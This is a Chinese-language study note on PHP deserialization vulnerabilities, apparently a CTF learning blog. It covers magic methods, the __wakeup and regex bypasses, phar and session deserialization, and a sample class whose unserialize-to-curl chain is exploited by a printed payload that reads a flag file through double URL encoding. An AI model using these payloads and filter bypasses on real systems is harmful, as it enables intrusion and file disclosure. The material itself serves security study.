title: 反序列化漏洞
---

### 基本概念

把对象转换为字节序列的过程称为对象的序列化**；**把字节序列恢复为对象的过程称为对象的反序列化。

对象的序列化主要有两种用途：

1） 把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；

2） 在网络上传送对象的字节序列。

序列化和反序列化本身并不存在问题。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。

常见的php系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode

#### 漏洞触发条件

unserialize函数，json_decode函数变量可控，php文件中存在可利用的类，类中有魔术方法

php将所有以 __ (两个下划线) 开头的类方法保留为魔术方法

常用的魔术方法

```php
__construct()  当一个对象创建时自动调用
__wakeup()     使用unserialse()函数时会自动调用
__destruct()   当对象被销毁时自动调用（php绝大多数情况下会自动调用销毁对象）
__sleep()      使用serialize()函数是触发
__toString()  把类当作字符串使用时触发，返回值需要为字符串
    (例如一个类A,实例化之后为$a,echo $a, 或者$a与字符串对比，这时就会触发该函数)
```

#### 不同属性序列化

Public属性序列化后格式:成员名

Private属性序列化后格式:%00类名%00成员名

Protected属性序列化后的格式:%00*%00成员名

new类名()：调用这个类的构造函数初始化对象，类名（）这个是构造函数，用来初始化。

在进行类的序列化时 私有属性 会加空白字符类名空白字符；保护属性会加 * （注意空白字符不是空格，空格的16进制为20，空白字符的16进制为00）

![](https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1.png)

#### 在类外定义类中的值

重新定义类中属性的值

通过new 类名 （”对类中的变量重新定义“）

![](https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2.png)

在类的外面定义类中的函数并调用方法

![](https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/3.png)

### wakeup绕过

```
__wakeup 使用unserialse（）函数时会自动调用
但是序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过__wakeup的执行

CVE-2016-7124(绕过__wakeup)
漏洞影响版本：
PHP5 < 5.6.25
PHP7 < 7.0.10
```

### OC绕过

OC绕过是通过修改O：数字（C：数字）来绕过正则匹配

例：

```php
if (preg_match('/[oc]:\d+:/',$var)){
die('error');
}
//若传入的参数有匹配了这个正则，则输入错误。
我们可以使用+号当做空格绕过，即O:+4即可绕过。
```

### 私有属性绕过

私有属性产生的一些不可见字符如果被过滤掉，可以用字符编码来替换这些字符进行绕过。

例：当反序列化中的属性是private时，在url输入payload时空字符不能被识别，会导致反序列化失败，我们可以在把空字符转换为16进制绕过。

```
\00就是16进制的chr（0）
%00是chr(0)的url编码
```

![](https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/4.png)

可以看出，当属性为private时，例：private $address = 'shanxi',反序列化的时候应为

```
\00test\00address
```

当属性为protected时，例：protected $age = '21',反序列化的时候应该为

```
\00*\00age
```

当代码过滤一些字符的时候`例如：flag`，我们可以通过16进制编码把flag编写为16进制，这时我们可以把表示字符串的字符s改为大写，这样它在反序列化的时候就能识别16进制，既可以绕过过滤，又可以成功执行反序列化。

![](https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/5.png)

![](https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/6.png)

可以看到，当s为大写时，可以成功识别16进制。

#### unserialize4

cURL会话

```php
初始化一个新的cURL会话并获取一个网页
<?php
// 创建一个新cURL资源
$ch = curl_init();

// 设置URL和相应的选项
curl_setopt($ch, CURLOPT_URL, "http://www.runoob.com/");
curl_setopt($ch, CURLOPT_HEADER, 0);

// 抓取URL并把它传递给浏览器
curl_exec($ch);

// 关闭cURL资源，并且释放系统资源
curl_close($ch);
?>
    //创建cURL就可以使用一些协议读取和执行相关命令
   // http://www.xxx.com/ssrf.php?url=file:///flag
```

```php
 <?php

class Hello {
    protected $a;

    function test() {
        $b = strpos($this->a, 'flag');//strpos()函数查找字符串在另一字符串中第一次出现的位置。如果                                         flag在a中出现过，则$b为真
        if($b) {
            die("Bye!");
        }
        $c = curl_init();//初始化一个cURL会话
        
        curl_setopt($c, CURLOPT_URL, $this->a);//设定请求的url
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);//	启用时会将头文件的信息作为数据流输出。 参数为1表示输出信息头,为0表示不输出
        curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 5);
        echo curl_exec($c);
    }
    
    function __destruct(){
        $this->test();
    }
}

if (isset($_GET["z"])) {
    unserialize($_GET["z"]);
} else {
    highlight_file(__FILE__);
}  
//由于一次GET传输会先进行URL解码，这里对字母a进行双url编码
```

![](https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/7.png)

```
payload
O:5:"Hello":1:{S:4:"%00*%00a";S:14:"file:///fl%25%36%31g";}
```

### 字符逃逸

反序列化字符串都是以一`";}`结束的，所以如果我们把`";}`带入需要反序列化的字符串中（除了结尾处），就能让反序列化提前闭合结束，后面的内容就丢弃了。

在反序列化的时候php会根据s所指定的字符长度去读取后边的字符,我们可以根据需求指定s的长度。

例：字符逃逸将age从13变成35。

![](https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/8.png)

### PHar反序列化

Phar反序列化可以在不使用php函数unserialize（）的前提下，进行php反序列化漏洞。

大多数PHP文件操作允许使用各种URL协议去访问文件路径：如`data://`，`zlib://`或`php://`。
例如常见的

```
include('php://filter/read=convert.base64-encode/resource=index.php');
include('data://text/plain;base64,xxxxxxxxxxxx');
```

`phar://`也是流包装的一种

#### phar原理

phar的本质是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。

phar文件类似zip和jar，它将PHP文件打包成一个文件然后PHP可以在不解压的情况下去访问这个包里面的php，并执行。

#### phar文件标识

a stub

可以理解为一个标志，格式为`xxx<?php xxx;__HALT_COMPILER();?>`，前面内容不限，但必须以`__HALT_COMPILER();?>`来结尾，否则phar扩展将无法识别这个文件为phar文件。

manifest

phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。

contents

被压缩文件的内容。

signature

签名，发在文件末尾。

#### 构建phar文件

将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。不同的php.ini文件对应着phpstudy的不同版本。

![](https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/9.png)

执行下面的文本生成phar文件

```php
<?php
    class TestObject {
    }
    $phar = new Phar("phar.phar"); //后缀名必须为phar，文件名可自己设置，例·：test.php
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new TestObject();
    $o -> data='hu3sky';//类中有一个属性data,属性值为hu3sky
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
//该文本的文件名为phar.php
```

修改php-5.5.38文件，可以看到成功执行，生成phar文件。

![](https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/10.png)

#### 打开phar文件

可以看到该phar文件由四部分组成，文件标识（__HALT_COMPILER()）

manifest（反序列化内容） ，压缩文件内容，签名。

![](https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/11.png)

#### 利用phar文件

```
当用phar://访问phar文件时，会触发反序列化，会触发魔法函数。
```

![](https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/12.jpg)

当在setStub添加图片文件头，可以绕过图片头检测。

![](https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/13.png)

#### 漏洞利用

只要phar://协议解析文件的时候，就会造成序列化的问题，所以文件操作的函数都可以触发这种序列化：

```php
fileatime / filectime / filemtime
stat / fileinode / fileowner / filegroup / fileperms
file / file_get_contents / readfile / `fopen``
file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable
parse_ini_file
unlink
copy
include
扩展
exif_thumbnail
exif_imagetype
imageloadfont
imagecreatefrom***
hash_hmac_file
hash_file
hash_update_file
md5_file
sha1_file
get_meta_tags
get_headers
getimagesize
getimagesizefromstring
```

绕过图片头检测

```php
<?php
class TestObject {}
$jpeg_header_size = 
"图片";
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->addFromString("test.txt","test");
$phar->setStub($jpeg_header_size." __HALT_COMPILER(); ?>");
$o = new TestObject();
$phar->setMetadata($o);
$phar->stopBuffering();
?>
```



### session反序列化

#### sseion的简单介绍

![](https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/14.png)

**PHP session 变量用于存储有关用户会话的信息，或更改用户会话的设置。Session 变量保存的信息是单一用户的，并且可供应用程序中的所有页面使用。**

Session 的工作机制是：为每个访问者创建一个唯一的 id (UID)，并基于这个 UID 来存储变量。UID 存储在 cookie 中，亦或通过 URL 进行传导。

**开启session**

在您把用户信息存储到 PHP session 中之前，首先必须启动会话。

**注释：**session_start() 函数必须位于 <html> 标签之前：

![](https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/15.png)

**终结session**

![](https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/23.png)

![](https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/16.png)

![](https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/17.png)

#### 开启session并执行文件

![](https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/18.png)

**删除文件**

```php
<?php
/**
 * Created by PhpStorm.
 * Date: 2017/12/16
 */
session_start();// 打开session
$_SESSION["demo1"] = "default_1";
var_dump(session_name());
//session的销毁
session_destroy();
?>
```

#### session存储方式

PHP中的session中的文件内容默认是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的。

![](https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/24.png)

```php
//以如下代码为例，查看不同存储引擎存储的结果
<?php
error_reporting(0);
ini_set('session.serialize_handler','php_binary');//这里换不同的存储引擎
session_start();
$_SESSION['username'] = $_GET['username'];
?>
```

![](https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/19.png)

![](https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20.png)

#### 有$_SESSION赋值的反序列化

当网站序列化存储 `session` 与反序列化读取 `session` 的方式不同时，就可能导致 `session` 反序列化漏洞的产生。 一般都是以 `php_serialize` 序列化存储 `session`， 以 `PHP` 反序列化读取 `session`，造成反序列化攻击。

![](https://zhuang-yongyi.gitee.io/yoyo/blog/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/21.png)

### 参考文章

```
PHP session 常见利用点 - 先知社区  https://xz.aliyun.com/t/8221#toc-5

反序列化 | Welcome eeknight.top  http://eeknight.top/2020/10/03/%E5%8F%8D%E5%BA%8F%E5%88%97/

反序列化 | shasha  https://zzdooo.gitee.io/sddoo/2020/10/02/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/

初探phar:// - 先知社区  https://xz.aliyun.com/t/2715

原理+实践掌握(PHP反序列化和Session反序列化) - 先知社区  https://xz.aliyun.com/t/7366#toc-4

Phar反序列化拓展攻击学习笔记 | Xiao Leung's Blog  http://www.plasf.cn/2019/12/12/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/
```

